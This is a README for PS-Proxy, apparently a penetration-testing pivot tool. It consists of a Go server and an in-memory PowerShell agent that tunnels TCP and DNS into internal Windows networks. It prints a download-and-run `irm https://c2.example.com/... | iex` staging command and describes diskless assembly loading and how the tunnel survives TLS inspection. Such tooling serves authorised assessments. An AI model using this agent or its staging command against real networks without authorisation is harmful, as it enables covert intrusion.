# PS-Proxy

PS-Proxy is being rebuilt as a professional route-based pivot with a Go Linux
server and a single-file PowerShell 5.1 agent. The project goal is reliable
operation for TCP-heavy AD tooling such as Impacket, NetExec, RustHound,
`ldapsearch`, and TCP-connect `nmap`, without proxychains and without requiring
administrator privileges on the Windows agent host.

> Current implementation status: the repo now has a working encrypted enrollment
> flow, a framed multiplexed TCP stream protocol, a diskless PowerShell/C# agent
> packaging flow, and a developer TCP relay for end-to-end protocol testing. The
> full production TUN/netstack data plane is still the next major milestone.

## Design decisions

- **Server:** Go, intended to run as root on Linux.
- **Data plane:** Linux transparent TCP redirect mode is implemented now for test-environment use: local tools connect directly to routed target IPs, iptables redirects matching TCP connections to the server, and the server relays the original destination through the enrolled agent. A true TUN/netstack backend remains the long-term production direction.
- **Agent:** Windows PowerShell 5.1 loader with a precompiled C# core embedded
  into a single `.ps1`.
- **Agent delivery:** one command, one file, no separate DLL transfer:
  `irm https://server/a/<one-time-id> | iex`.
- **Target-side privileges:** no local admin required on the Windows agent host.
- **Enrollment:** the server creates a short-lived one-time staging URL. The
  generated agent script contains an enrollment token rather than a long-term
  PSK.
- **Trust anchor:** TLS is transport and staging only. The agent pins the stable
  PS-Proxy application identity public key and establishes an authenticated
  encrypted tunnel inside TLS before enrollment tokens or tunnel frames are sent.
- **Disk behavior:** release agents do not use `Add-Type`, do not invoke
  `csc.exe` on the target, and do not intentionally write the managed agent DLL
  to disk. The embedded DLL is loaded with
  `[System.Reflection.Assembly]::Load(byte[])`.

## Repository layout

```text
cmd/psproxy-server/          Go server entrypoint
internal/protocol/           framed tunnel protocol helpers and tests
internal/staging/            one-time agent staging/enrollment helpers
agent/PSProxy.Agent/         PowerShell 5.1-compatible C# agent core source
agent/loader/agent.ps1.tmpl  single-file PowerShell loader template
release/agent.ps1            packaged release agent placeholder/artifact
tools/build-agent.ps1        Windows build script for release/agent.ps1
agent.ps1                    source-checkout pointer to release agent workflow
```

The GitHub repository intentionally contains both source code and a release
agent location. Packaged releases should replace `release/agent.ps1` with a
ready-to-run generated file so an operator can download and run without doing
manual packaging.

## Build the Go server on Linux

From the repo root:

```bash
go test ./...
go build -o psproxy-server ./cmd/psproxy-server
```

The build produces `./psproxy-server`.

## Build the single-file PowerShell 5.1 release agent

The first supported target is Windows PowerShell 5.1, so build the release agent
on a Windows machine with the .NET Framework compiler available.

Open Windows PowerShell from the repo root and run:

```powershell
powershell -ExecutionPolicy Bypass -File tools\build-agent.ps1
```

That script:

1. Compiles `agent\PSProxy.Agent\PSProxy.Agent.cs` with the .NET Framework C#
   compiler.
2. Compresses the compiled `PSProxy.Agent.dll`.
3. Base64-embeds the compressed DLL into `agent\loader\agent.ps1.tmpl`.
4. Writes the single-file release loader to `release\agent.ps1`.
5. Writes `release\agent_assembly.b64`, which the Go server uses by default to render one-time staged agents.

The Windows target still receives only one PowerShell script. The build step is
for the release maintainer, not the operator running the agent. Keep
`release\agent_assembly.b64` next to the server working directory, or pass it
explicitly with `--agent-assembly-b64-file`.

## Start the server with transparent TCP routing

Use a real certificate for HTTPS transport/staging. PS-Proxy will create or reuse
`psproxy_identity.pem` as the application-layer trust anchor; keep this file
stable across server restarts and redeployments so existing staged agents trust
the same server identity. On the Linux server, run as root so PS-Proxy can
install and remove iptables NAT rules:

```bash
sudo ./psproxy-server \
  --domain c2.example.com \
  --cert /etc/letsencrypt/live/c2.example.com/fullchain.pem \
  --key /etc/letsencrypt/live/c2.example.com/privkey.pem \
  --route 10.10.10.0/24 \
  --redirect \
  --max-streams 256 \
  --dns-listen 127.0.0.1:5353 \
  --dns-target 10.10.10.10:53
```

With `--redirect`, PS-Proxy creates an iptables NAT chain for each `--route` and
redirects matching local TCP connects into a loopback listener. The server reads
the original destination with `SO_ORIGINAL_DST`, sends that host:port through the
encrypted tunnel, and the Windows agent opens the target with a normal outbound
`TcpClient` from its network position.

The server owns its configured `--listen`/`--port` socket while it is running.
By default that is `0.0.0.0:443`, so another web server or reverse proxy cannot
bind port 443 on the same IP at the same time. If you need another service on
443, either bind PS-Proxy to a different address with `--listen`, run PS-Proxy on
a different external port with `--port`, or put a fronting load balancer/reverse
proxy on 443 and forward PS-Proxy traffic to its own backend port.

The server prints a one-time command:

```powershell
irm https://c2.example.com/a/<one-time-id> | iex
```

The generated script auto-starts, loads the embedded C# core in memory, verifies
the staged PS-Proxy identity public key with an application-layer handshake,
sends enrollment inside the encrypted/authenticated tunnel, and then uses that
protected tunnel for all framed TCP and DNS relay traffic.

## Optional fixed-target developer TCP relay

For controlled protocol testing without iptables redirects, use the fixed-target
TCP relay. Example:

```bash
sudo ./psproxy-server \
  --domain c2.example.com \
  --cert /etc/letsencrypt/live/c2.example.com/fullchain.pem \
  --key /etc/letsencrypt/live/c2.example.com/privkey.pem \
  --route 10.10.10.0/24 \
  --tcp-listen 127.0.0.1:1389 \
  --tcp-target 10.10.10.219:389
```

Then run the printed one-liner on the Windows host. After the agent connects,
test from the Linux server:

```bash
nc -vz 127.0.0.1 1389
ldapsearch -x -H ldap://127.0.0.1:1389 -D 'user@example.local' -W -b 'DC=example,DC=local' '(objectClass=domain)'
```

Transparent redirect mode is the recommended test-environment workflow right now.
The fixed-target relay remains useful when you want a single local port mapped to
a single target for debugging. Use `--max-streams` to cap concurrent proxied TCP
connections during high-concurrency tools such as NetExec; the default is 256.
When `--dns-listen` and `--dns-target` are set together, the server exposes UDP
and TCP DNS listeners on the same local address and forwards raw DNS queries
through the enrolled agent to the internal DNS server reachable from the agent
host.

## Security notes

- Use HTTPS staging. Plain HTTP `irm | iex` is mechanically possible, but it is
  not acceptable for sensitive environments because staging tampering means code
  execution on the Windows host.
- TLS is transport only; do not use the HTTPS certificate as the PS-Proxy root of trust.
- The server has a stable RSA identity key (`--identity-key`, default
  `psproxy_identity.pem`). If the file is missing, the server generates a
  3072-bit RSA key and logs the SHA-256 pin of the public key DER.
- Keep `psproxy_identity.pem` stable and private. Rotating it intentionally
  changes the PS-Proxy trust anchor and requires staging new agents.
- The staged agent embeds the server identity public key, performs an
  application-layer PSP1 handshake, verifies a server HMAC proof, and only then
  sends enrollment/reconnect tokens inside encrypted authenticated frames.
- Enrollment URLs are short-lived and one-time use.
- The enrollment token is placed in the HTTPS response body, not in the URL.
- Do not log generated agent bodies or enrollment tokens.
- The loader avoids intentional target-side file writes for the managed payload,
  but host telemetry, PowerShell logging, AMSI, EDR, crash dumps, or pagefile
  behavior are outside the loader's control.


### TLS inspection / enterprise decryption

PS-Proxy now treats HTTPS/TLS as transport and staging rather than as the tunnel
root of trust. Enterprise TLS inspection products such as Palo Alto, Zscaler, or
other decrypting proxies may present an enterprise-issued leaf certificate to the
agent; this should no longer break agent/server trust because the agent verifies
the staged PS-Proxy identity public key inside the TLS connection.

Operational guidance:

- Keep using HTTPS for staging so the one-time loader is not exposed to trivial
  network tampering.
- Keep `psproxy_identity.pem` private and stable. It is the PS-Proxy identity,
  and its public key pin is what identifies the legitimate server to agents.
- Back up `psproxy_identity.pem` with the same care as other server secrets. If
  it is lost and regenerated, previously staged agents will not trust the new
  identity unless they are restaged with the new public key.
- TLS inspection can still observe the outer HTTPS transport metadata, but it
  cannot read or tamper with protected PSP1 tunnel frames after the
  application-layer handshake without detection.

## Current implementation status

Implemented now:

- Go TLS listener with mixed HTTP staging and raw agent tunnel handling.
- Stable PS-Proxy RSA identity key generation/reuse with a logged public key pin staged into generated agents.
- Short-lived one-time staging URLs.
- Application-layer PSP1 secure handshake before enrollment, followed by encrypted/authenticated frame transport and reconnect-token authentication after first enrollment.
- Agent auto-reconnect with exponential backoff for transient tunnel failures.
- Framed multiplexed stream protocol.
- Linux transparent TCP redirect mode for direct local-tool TCP connections to routed target IPs.
- Fixed-target TCP relay mode for protocol validation.
- Bounded concurrent stream handling with per-stream local write queues so one slow local TCP client cannot block the whole multiplexed agent session.
- Optional UDP DNS relay that forwards raw DNS queries through the agent to an internal DNS server.
- JSON `/status` endpoint for agent and stream visibility.
- C# agent stream relay that opens normal outbound `TcpClient` connections from
  the Windows host.
- PowerShell loader template that loads a compressed/base64 managed assembly from
  memory.
- Windows build script to package the C# core into `release/agent.ps1`.

Next milestone:

- Replace the Linux transparent redirect backend with a true production Go TUN/netstack data plane.
- Add route setup/cleanup and `doctor` checks.
- Add integration tests for LDAP/RustHound-scale long-running TCP streams.

## Testing direction

Before this project should be trusted for real assessments, it needs a lab test
matrix that includes:

- large bidirectional byte-stream integrity tests;
- many concurrent stream tests;
- long-running LDAP/RustHound collection tests;
- NetExec SMB/LDAP tests;
- Impacket SMB/LDAP/RPC tests;
- reconnect and stale route cleanup tests;
- DNS relay tests against an internal AD DNS server;
- malformed frame and enrollment fuzz tests;
- certificate pin mismatch tests.
